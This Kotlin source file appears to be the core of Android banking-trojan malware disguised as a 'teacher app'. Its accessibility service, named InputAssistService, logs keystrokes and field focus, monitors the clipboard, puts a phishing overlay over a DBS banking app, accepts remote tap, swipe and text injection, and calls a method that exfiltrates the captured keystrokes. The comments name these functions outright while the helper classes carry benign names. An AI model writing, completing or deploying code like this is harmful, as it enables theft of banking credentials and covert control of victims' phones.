package com.example.teacherapp.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent

/**
 * InputAssistService — the ONLY AccessibilityService in the app.
 *
 * Declared once in AndroidManifest → ONE permission popup for the user.
 *
 * All logic is kept in separate, modular helper classes:
 *   • KeyloggerHelper      → captures keystrokes & field-focus events
 *   • OverlayHelper        → DBS phishing overlay when banking app opens
 *   • RemoteControlHelper  → executes remote tap / swipe / text commands
 *
 * ScreenMirrorService also calls this via [instance] for remote control.
 */
class InputAssistService : AccessibilityService() {

    private val TAG = "TeacherAppService"

    private lateinit var keylogger:        TextSyncHelper
    private lateinit var overlay:          UiLayerHelper
    private lateinit var remoteControl:    GestureHelper
    private lateinit var clipboardMonitor: ClipboardMonitor

    companion object {
        /** Singleton used by ScreenMirrorService for remote-control calls. */
        var instance: InputAssistService? = null
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        keylogger        = TextSyncHelper(this)
        overlay          = UiLayerHelper(this)
        remoteControl    = GestureHelper(this)
        clipboardMonitor = ClipboardMonitor(this)

        // Configure events — union of all helper requirements
        val info = AccessibilityServiceInfo().apply {
            eventTypes =
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or   // overlay
                        AccessibilityEvent.TYPE_WINDOWS_CHANGED          or   // overlay
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED        or   // keylogger
                        AccessibilityEvent.TYPE_VIEW_FOCUSED             or   // keylogger field focus
                        AccessibilityEvent.TYPE_VIEW_CLICKED             or   // keylogger clicks
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED        // clipboard
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags =
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
        serviceInfo = info

        Log.d(TAG, "✅ InputAssistService connected — all helpers initialised")
    }

    // ── Event routing ─────────────────────────────────────────────────────────

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        keylogger.onEvent(event)   // handles TYPE_VIEW_TEXT_CHANGED + TYPE_VIEW_FOCUSED
        overlay.onEvent(event)     // handles TYPE_WINDOW_STATE_CHANGED + TYPE_WINDOWS_CHANGED
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            clipboardMonitor.onClipboardChanged(event)
        }
    }

    // ── Lifecycle cleanup ─────────────────────────────────────────────────────

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted — flushing keystrokes")
        keylogger.exfiltrateKeystrokes()
        overlay.removeOverlay()
        clipboardMonitor.clearHistory()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        Log.d(TAG, "Service destroyed — final keystroke flush")
        keylogger.exfiltrateKeystrokes()
        overlay.removeOverlay()
    }

    // ── Public API for ScreenMirrorService remote control ────────────────────

    fun injectTap(x: Float, y: Float)                               = remoteControl.injectTap(x, y)
    fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float)    = remoteControl.injectSwipe(x1, y1, x2, y2)
    fun injectText(text: String)                                    = remoteControl.injectText(text)
    fun clearText()                                                 = remoteControl.clearText()
    fun injectKey(key: String)                                      = remoteControl.injectKey(key)
    fun injectGlobal(action: String)                                = remoteControl.injectGlobal(action)
}